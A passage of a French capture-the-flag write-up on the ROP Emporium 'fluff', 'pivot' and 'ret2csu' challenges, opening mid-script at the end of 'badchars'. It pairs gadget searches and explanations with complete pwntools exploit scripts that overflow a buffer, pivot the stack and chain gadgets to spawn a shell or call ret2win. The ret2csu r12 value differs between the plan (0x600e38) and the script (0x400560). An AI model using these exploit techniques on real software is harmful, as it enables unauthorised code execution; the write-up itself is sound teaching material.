xor_r15_r14b = p64(0x400b30)

payload = junk
payload += pop_r12_r13_r14_r15
payload += binsh
payload += p64(data_addr)
payload += xor_key
payload += p64(data_addr)
payload += mov_r13_r12
payload += xor_r15_r14b

payload += pop_r15
payload += p64(data_addr + 1)
payload += xor_r15_r14b

payload += pop_r15
payload += p64(data_addr + 2)
payload += xor_r15_r14b

payload += pop_r15
payload += p64(data_addr + 3)
payload += xor_r15_r14b

payload += pop_r15
payload += p64(data_addr + 4)
payload += xor_r15_r14b

payload += pop_r15
payload += p64(data_addr + 5)
payload += xor_r15_r14b

payload += pop_r15
payload += p64(data_addr + 6)
payload += xor_r15_r14b

payload += pop_r15
payload += p64(data_addr + 7)
payload += xor_r15_r14b

payload += pop_rdi
payload += p64(data_addr)
payload += system

#print payload
p = process("./badchars")
#gdb.attach(p, '''
#b checkBadchars
#''')

p.sendline(payload)
p.interactive()
~~~

> Note : Une boucle serais plus élégante mais je préfère avoir une vision plus globale de mon rop chain.

## fluff 
Ce challenge est proche de Write4, mais ce dernier pose quelques petites difficultés en plus de par le nombre de gadgets directement utilisables sont réduits. 
Lançons GDB-peda pour trouver la taille des valeurs de bourrage nécessaire pour créer le buffer overflow (BOF).

> La valeur est identique aux précédents : 40 octets. 

Avec ROPgadget, je cherche un gadget valable pour `pop rdi` : 

~~~bash
root@kali:~/rop_emporium/fluff# ROPgadget --binary fluff | grep "pop rdi" 
0x00000000004008c3 : pop rdi ; ret
~~~

Puis vers un `mov` qui déplace la string `/bin//sh` dans la section `.data` :

~~~bash
root@kali:~/rop_emporium/fluff# ROPgadget --binary fluff --depth 20 | grep "mov .*\[" --color

0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
~~~

> le paramètre **depth** permet de casser la limite de taille des gadgets affichés. 

Cette fois, nous allons devoir ruser pour faire fonctionner la ROP chain car la suite du gadget agis sur l’adresse ou nous souhaitons écrire la chaîne. 
Pour cela nous allons utiliser les mêmes tips qu'avec badchars pour appliquer un `xor` sur le premier Octets de la chaîne avec un `0x0`pour ne pas altérer la chaîne. 

> Oui, 128 xor 0, ça fait toujours 128 !

Maintenant il faut modifier le registre `r10`  : 

~~~bash
0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
~~~

Ce gadget se sert de `xchg` qui va simplement échanger deux valeurs.
Pour cela nous allons devoir modifier `r11` :

~~~bash
0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
~~~
Le premier gadget met `r11` a zéro, le deuxième nous permet de copier la valeur de `r12` dans `r11`. 

> Toujours pareil à précédemment 

Néanmoins, il faut trouver un moyen de mettre des données dans `r12` : 

~~~bash
0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
~~~

Voici notre exploit, obtenus à partir de ces éléments :

~~~python
#!/usr/bin/env python

from pwn import * 

junk = "A"*40
pop_rdi = p64(0x4008c3)
data_addr = p64(0x601050)
system = p64(0x4005e0)

binsh = "/bin//sh"
mov_qword = p64(0x40084e)
xor_r11_r11 = p64(0x400822)
pop_r12 = p64(0x400832)
xor_r11_r12 = p64(0x40082f)
xchg_r11_r10 = p64(0x400840)

p = process("./fluff")

payload = junk
payload += xor_r11_r11
payload += p64(0) 
payload += pop_r12 
payload += data_addr 
payload += xor_r11_r12 
payload += p64(0) 
payload += xchg_r11_r10 
payload += p64(0) 

payload += xor_r11_r11 
payload += p64(0) 
payload += pop_r12 
payload += binsh
payload += xor_r11_r12
payload += p64(0) 

payload += mov_qword
payload += p64(0) 
payload += p64(0) 
payload += pop_rdi 
payload += data_addr
payload += system


print payload 

info("Send magic bytes in binary")

p.recvuntil(">")
p.sendline(payload)
p.interactive()

~~~

Les rop chain sont toujours plus complexes mais nous montrent qu'il est primordial de lire entre les lignes pour trouver des détails intéressants à exploiter. 

## pivot 

Cette fois ça ne rigole plus, deux nouvelles techniques d'un coup : 
- ret2plt 
- stack pivot 

Ce binaire offre tout juste la place pour "pivoter" et déplacer le rop chain dans un autre espace mémoire. 
L'idée ici est de faire un exploit en deux parties, l'une avec le pivot et l'autre avec la partie réellement exploitation. 

### Smash the stack 
Comme chacun des challenges, nous partons sur une valeur de bourrage de 40 octets. 
Un test rapide au debugger nous permet de confirmer la réécriture de `RIP`: 

~~~python
#!/usr/bin/env python

from pwn import *

junk = "A"*40

p = process("./pivot")

# debug
pid = util.proc.pidof(p)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)

payload = junk
payload += p64(0xdeadbeef)


p.recvuntil(">")
p.sendline("test")
p.recvuntil(">")
p.sendline(payload)
p.interactive()
~~~
une fois lancé et attaché dans GDB :
~~~bash
Stopped reason: SIGSEGV
0x00000000deadbeef in ?? ()
gdb-peda$ i r rip
rip            0xdeadbeef          0xdeadbeef
gdb-peda$
~~~

### stack pivot 
Maintenant il nous faut pivoter, fort heureusement le binaire nous envoie une fuite d'adresse à chaque lancement : 

~~~bash
root@kali:~/rop_emporium/pivot# ./pivot
pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7f356e17ef10
Send your second chain now and it will land there
~~~

Nous allons pouvoir l'appeler par ce biais avec des gadgets modifiant `RSP` :

~~~bash
root@kali:~/rop_emporium/pivot# ROPgadget --binary pivot | grep "rsp" --color
0x0000000000400aff : add byte ptr [rax - 0x3d], bl ; xchg rax, rsp ; ret
0x00000000004007cb : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004007cd : add rsp, 8 ; ret
0x0000000000400b5a : call qword ptr [rsp + rbx*8]
0x0000000000400b02 : xchg rax, rsp ; ret
~~~

Nous utiliserons ici `0x0000000000400b02 : xchg rax, rsp ; ret`. Mais nous devons avant toutes choses trouver un moyen de modifier `RAX`: 

~~~bash
root@kali:~/rop_emporium/pivot# ROPgadget --binary pivot | grep "rax" --color
0x0000000000400afb : nop dword ptr [rax + rax] ; pop rax ; ret
0x00000000004008f8 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400b78 : nop dword ptr [rax + rax] ; ret
0x0000000000400945 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400afa : nop word ptr [rax + rax] ; pop rax ; ret
0x0000000000400b00 : pop rax ; ret
0x00000000004008ef : pop rbp ; mov edi, 0x602078 ; jmp rax
~~~

Le `0x0000000000400b00 : pop rax ; ret` fait l'affaire. 

Voici donc une idée de la rop chain de pivot : 

~~~bash
40 * A 
pop rax ; ret
[Adresse fuitée par le programme]
xchg rax, rsp ; ret
~~~

Nous avons de quoi pivoter !

### call foothold function 
Étant donné que la fonction `foothold` n'est pas appelé dans le binaire, elle n'est pas inscrite dans la GOT. Il faut donc l'appeler pour que la GOT soit peuplé. Elle nous servira ensuite pour appeler `ret2win`a l'aide de l'offset :

~~~bash
root@kali:~/rop_emporium/pivot# objdump -D pivot | grep foot
0000000000400850 <foothold_function@plt>:
  400850:	ff 25 f2 17 20 00    	jmpq   *0x2017f2(%rip)        # 602048 <foothold_function>
  400aeb:	e8 60 fd ff ff       	callq  400850 <foothold_function@plt>
~~~

`0x400850`est représente l'adresse de la fonction dans la **PLT** et `0x602048` celle de la **GOT**. 
Nous pouvons ainsi l'appeler avec son adresse dans le **PLT**. 

### calcul de l'offset 
Étant donné que nous avons accès a la bibliothèque contenant la fonction `foothold`, nous pouvons en déterminer les offset : 

~~~bash
root@kali:~/rop_emporium/pivot# rabin2 -s libpivot.so | grep foot
057 0x00000970 0x00000970 GLOBAL   FUNC   24 foothold_function
root@kali:~/rop_emporium/pivot# rabin2 -s libpivot.so | grep ret2win
049 0x00000abe 0x00000abe GLOBAL   FUNC   26 ret2win
~~~

En soustrayant `0x970` a `0xABE` nous obtenons `0x14E`, c'est notre offset !!
### appel de ret2win 
Pour appeler la fonction, nous devons utiliser la dresse **GOT** de la fonction `foothold` et lui ajouter l'offset obtenus juste avant. 
Pour cela nous devons agir sur l'adresse et non plus sur la valeur contenue a cette adresse et enfin l'appeler avec `call` : 

~~~bash
root@kali:~/rop_emporium/pivot# ROPgadget --binary pivot  | grep "call" --color
0x0000000000400ac2 : call 0x400818
0x0000000000400b59 : call qword ptr [r12 + rbx*8]
0x0000000000400b5a : call qword ptr [rsp + rbx*8]
0x000000000040098e : call rax
0x0000000000400ca3 : call rsp
~~~

Ici, deux solutions s'offrent à nous, voyons voir quel registre nous pouvons additionner : 

~~~bash
root@kali:~/rop_emporium/pivot# ROPgadget --binary pivot  | grep "rsp" --color
0x0000000000400aff : add byte ptr [rax - 0x3d], bl ; xchg rax, rsp ; ret
0x00000000004007cb : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004007cd : add rsp, 8 ; ret
0x0000000000400b5a : call qword ptr [rsp + rbx*8]
0x0000000000400ca3 : call rsp
0x0000000000400989 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400988 : je 0x400981 ; push rbp ; mov rbp, rsp ; call rax
0x000000000040098b : mov rbp, rsp ; call rax
~~~

Pas `RSP`, voyons `RAX` : 

~~~bash
root@kali:~/rop_emporium/pivot# ROPgadget --binary pivot  | grep "rax" --color
0x0000000000400b7e : add byte ptr [rax], al ; ret
0x0000000000400afd : add byte ptr [rax], r8b ; pop rax ; ret
0x0000000000400b09 : add rax, rbp ; ret
0x00000000004008f2 : and byte ptr [rax], ah ; jmp rax
0x0000000000400967 : and byte ptr [rax], al ; add ebx, esi ; ret
~~~

Nous pouvons ici additionner `rax` avec `rbp`, nous devons donc trouver un `pop rbp` et un moyen de charger l'adresse contenus dans `rax` dans `rax` :

~~~bash
root@kali:~/rop_emporium/pivot# ROPgadget --binary pivot  | grep "\[rax\]" --color
0x00000000004008f2 : and byte ptr [rax], ah ; jmp rax
0x0000000000400967 : and byte ptr [rax], al ; add ebx, esi ; ret
0x0000000000400b06 : mov eax, dword ptr [rax] ; ret
0x0000000000400b05 : mov rax, qword ptr [rax] ; ret

root@kali:~/rop_emporium/pivot# ROPgadget --binary pivot  | grep "rbp" --color
0x0000000000400b07 : add bl, al ; add rax, rbp ; ret
0x00000000004008fc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004008ef : pop rbp ; mov edi, 0x602078 ; jmp rax
0x0000000000400b6b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400b6f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400900 : pop rbp ; ret
~~~

Maintenant construisons la rop chain : 

~~~bash
@ PLT foothold
pop rax
@ GOT foothold
mov [rax] rax ; ret
[Offset]0x14E
add rax, rbp ; ret
call rax ; ret 
~~~

### Le script : 

~~~python
#!/usr/bin/env python

from pwn import *

#foorhold plt 400850 got 602048
plt_foothold = 0x400850
got_foothold = 0x602048

# pop rax
pop_rax = 0x400b00
# xchg rax rsp
xchg_rax_rsp = 0x400b02
pop_rdi = p64(0x400b73)
pop_rbp = p64(0x400900)
mov_rax_rax = p64(0x400b05)
add_rax_rbp = p64(0x400b09)
call_rax = p64(0x40098e)
junk = "A"*40

p = process("./pivot")

# debug
#pid = util.proc.pidof(p)[0]
#print "The pid is: "+str(pid)
#util.proc.wait_for_debugger(pid)


#stage 1
# Pivot from small area to another one

leaked_addr = int(p.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:').decode('UTF-8').split(' ')[-1], 16)
print hex(leaked_addr)

payload = junk
payload += p64(pop_rax)
payload += p64(leaked_addr)
payload += p64(xchg_rax_rsp)


#payload2 += pop_rdi
#payload2 = junk
payload2 = p64(plt_foothold)
payload2 += p64(pop_rax)
payload2 += p64(got_foothold)
payload2 += mov_rax_rax
payload2 += pop_rbp
payload2 += p64(0x14e)
payload2 += add_rax_rbp
payload2 += call_rax

#p.recvuntil(">")
p.sendline(payload2)
p.recvuntil(">")
p.sendline(payload)
p.interactive()
~~~
## ret2csu 
Nous atteignions le sommet en termes de difficultés. 
Nous allons ici exploiter une vulnérabilité assez jeune du nom de **ret2csu**. 
Pour faire court, tout programme, même minimaliste intègre un morceau de `libc` linké de manière fixe. 
Cela permet d'avoir des gadgets ROP performant et surtout disponible partout !
Dans ce dernier challenge, il nous faut appeler la fonction `ret2win` mais non sans difficultés. 
Débutons par la recherche des deux gadgets intéressants dans **libc_csu_init** : 

~~~bash
0000000000400840 <__libc_csu_init>:

  400880:	4c 89 fa             	mov    rdx,r15
  400883:	4c 89 f6             	mov    rsi,r14
  400886:	44 89 ef             	mov    edi,r13d
  400889:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  40088d:	48 83 c3 01          	add    rbx,0x1
  400891:	48 39 dd             	cmp    rbp,rbx
  400894:	75 ea                	jne    400880 <__libc_csu_init+0x40>
  400896:	48 83 c4 08          	add    rsp,0x8
  40089a:	5b                   	pop    rbx
  40089b:	5d                   	pop    rbp
  40089c:	41 5c                	pop    r12
  40089e:	41 5d                	pop    r13
  4008a0:	41 5e                	pop    r14
  4008a2:	41 5f                	pop    r15
  4008a4:	c3                   	ret
~~~

En fait nous devons utiliser un gadget et un pseudo gadget, le premier a `0x40089a` et le deuxième a `0x400880`. 
Nous pouvons grâce a lui modifier le contenus des registres et surtout du registre `rdx`. 
Étant donné que le second gadget n'en n'est pas un, nous devons trouver une technique pour le transformer en gadget tout en évitant de créer une erreur de segmentation dans le flux d’exécution. 

J'ai bien tenté d'utiliser le `call` pour appeler la fonction `ret2win()` mais segfault oblige, j'ai trouver une autre technique menant a un `ret`. 
Pour cela nous allons tout bêtement appeler `_init` :

~~~bash
0000000000400560 <_init>:
  400560:	48 83 ec 08          	sub    rsp,0x8
  400564:	48 8b 05 8d 0a 20 00 	mov    rax,QWORD PTR [rip+0x200a8d]        # 600ff8 <__gmon_start__>
  40056b:	48 85 c0             	test   rax,rax
  40056e:	74 02                	je     400572 <_init+0x12>
  400570:	ff d0                	call   rax
  400572:	48 83 c4 08          	add    rsp,0x8
  400576:	c3                   	ret
~~~

Néanmoins, nous ne pouvons pas l'appeler directement, nous trouvons ce que nous cherchons dans `_DYNAMIC` une variable qui y fait appel :

~~~bash
gdb-peda$ x/16g &_DYNAMIC
0x600e20:	0x1	0x1
0x600e30:	0xc	0x400560
0x600e40:	0xd	0x4008b4
0x600e50:	0x19	0x600e10
0x600e60:	0x1b	0x8
0x600e70:	0x1a	0x600e18
0x600e80:	0x1c	0x8
0x600e90:	0x6ffffef5	0x400298

gdb-peda$ x/g 0x600e38
0x600e38:	0x400560
~~~

Elle n’altère pas `RBX`et offre un joli `ret`
Il faut également prendre garde a ceci : 

~~~bash
 40088d:	48 83 c3 01          	add    rbx,0x1
 400891:	48 39 dd             	cmp    rbp,rbx
400896:	48 83 c4 08          	add    rsp,0x8
~~~

La première partie va ajouter 1 a la valeur de `rbx`(que nous initialiserons a 0). 
La deuxième compare `rbp`et `rbx`, il faut donc initialiser `rbp`a 1.
Pour finir le pointeur de stack est incrémenté de 8. Il faut donc ajouter une valeur de bourrage. 

Maintenant : 
- appel du gadget 1 
- mise en place des données pour chaque registre : 
    - `0x00`pour `rbx`, `r13`, `r14`
    - `0x01`pour `rbp`
    - `0x600e38` pour `r12`
    - `0xdeadcafebabebeef` pour `r15`
- appel du second gadget
- envoie d'une valeur de bourrage sur la stack
- envoie de `0x00` sur tous les registres
- adresse de `ret2win`

Scriptons ceci : 

~~~python
#!/usr/bin/env python

from pwn import *

junk = "A"*40

# Note, objdump sort par defaut une syntaxe at n t donc src to dest
#gadget 1

#  40089a	5b                   	pop    rbx
#  40089b	5d                   	pop    rbp
#  40089c	41 5c                	pop    r12
#  40089e	41 5d                	pop    r13
#  4008a0	41 5e                	pop    r14
#  4008a2	41 5f                	pop    r15
#  4008a4	c3                   	retq
gadget1 = p64(0x40089a)

# gadget 2

#  400880	4c 89 fa             	mov    r15,rdx
#  400883	4c 89 f6             	mov    r14,rsi
#  400886	44 89 ef             	mov    r13d,edi
#  400889	41 ff 14 dc          	callq  (r12,rbx,8)
gadget2 = p64(0x400880)

ret2win = p64(0x4007b1)

p = process("./ret2csu")

# debug
#pid = util.proc.pidof(p)[0]
#print "The pid is: "+str(pid)
#util.proc.wait_for_debugger(pid)

payload = b"A"  * 40
payload += gadget1
payload += p64(0x00)            # pop rbx
payload += p64(0x01)            # pop rbp
payload += p64(0x400560)    # pop r12
payload += p64(0x00)            # pop r13
payload += p64(0x00)            # pop r14
payload += p64(0xdeadcafebabebeef) # pop r15
payload += gadget2
payload += p64(0x00)            # add rsp,0x8 padding
payload += p64(0x00)            # rbx
payload += p64(0x00)            # rbp
payload += p64(0x00)            # r12
payload += p64(0x00)            # r13
payload += p64(0x00)            # r14
payload += p64(0x00)            # r15
payload += ret2win

p.recvuntil(">")
p.sendline(payload)
p.interactive()
~~~

## Références 

- https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/
- https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
- https://beta.hackndo.com/return-oriented-programming/
- https://web.stanford.edu/class/cs107/resources/onepage_x86-64.pdf
- https://github.com/t00sh/tosh-codes/blob/master/_posts/2013-08-26-rop-tricks-1.md
- https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf
- http://www.egr.unlv.edu/~ed/assembly64.pdf
- https://github.com/Hackndo/misc/blob/master/syscalls64.md
- https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
- https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
- https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
